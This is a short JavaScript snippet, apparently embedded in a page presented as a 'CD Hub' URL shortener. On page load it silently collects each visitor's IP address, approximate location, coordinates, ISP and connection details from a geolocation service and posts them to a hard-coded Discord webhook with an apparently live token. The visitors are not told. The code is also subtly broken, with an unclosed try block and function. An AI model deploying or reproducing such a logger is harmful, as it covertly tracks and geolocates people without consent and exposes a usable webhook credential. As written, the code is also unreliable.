async function sendAllUserDataToWebhook() {
  try {
    // Fetching user info from ipapi API
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();

    // Structure the embed for Discord with all available data
    const embed = {
      title: "New User Info", // Embed title
      description: "User data collected from the website visit.", // Embed description
      color: 0x32CD32, // Embed color (green)
      fields: [
        { name: "IP Address", value: data.ip || 'N/A', inline: true },
        { name: "City", value: data.city || 'N/A', inline: true },
        { name: "Region", value: data.region || 'N/A', inline: true },
        { name: "Region Code", value: data.region_code || 'N/A', inline: true },
        { name: "Country", value: data.country_name || 'N/A', inline: true },
        { name: "Country Code", value: data.country_code || 'N/A', inline: true },
        { name: "Postal Code", value: data.postal || 'N/A', inline: true },
        { name: "Latitude", value: data.latitude || 'N/A', inline: true },
        { name: "Longitude", value: data.longitude || 'N/A', inline: true },
        { name: "ISP", value: data.isp || 'N/A', inline: true },
        { name: "Provider/Organization", value: data.org || 'N/A', inline: true },
        { name: "Timezone", value: data.timezone || 'N/A', inline: true },
        { name: "ASN", value: data.asn || 'N/A', inline: true },
        { name: "Carrier", value: data.carrier || 'N/A', inline: true },
        { name: "IP Type", value: data.ip_type || 'N/A', inline: true },
        { name: "Continent Code", value: data.continent_code || 'N/A', inline: true },
        { name: "Continent", value: data.continent_name || 'N/A', inline: true },
        { name: "Languages", value: data.languages || 'N/A', inline: true },
        { name: "Currency", value: data.currency || 'N/A', inline: true },
        { name: "City Population", value: data.city_population || 'N/A', inline: true },
        { name: "Connection Type", value: data.connection_type || 'N/A', inline: true },
        { name: "Geo Name ID", value: data.geoname_id || 'N/A', inline: true },
        { name: "ASN Organization", value: data.asn_org || 'N/A', inline: true },
        { name: "Org Type", value: data.org_type || 'N/A', inline: true },
        { name: "Threat Level", value: data.threat_level || 'N/A', inline: true }
      ],
      footer: {
        text: "CD Hub - URL Shortener" // Footer text
      }
    };

    // Replace with your actual Webhook URL
    const webhookURL = 'https://discord.com/api/webhooks/1325964921938116619/-Xyo8xmmD2CCY6V3s8RyzmNe1INHKWNOz0S-o7-3jek-xD8aJ1433Qg518t90gzePUjo';

    // Sending the embed with all available data to the Discord webhook
    const webhookResponse = await fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ embeds: [embed] }), // Sending the embed JSON
    });
}

// Wait for the page to load and send the user info
window.onload = async () => {
  await sendAllUserDataToWebhook();
};
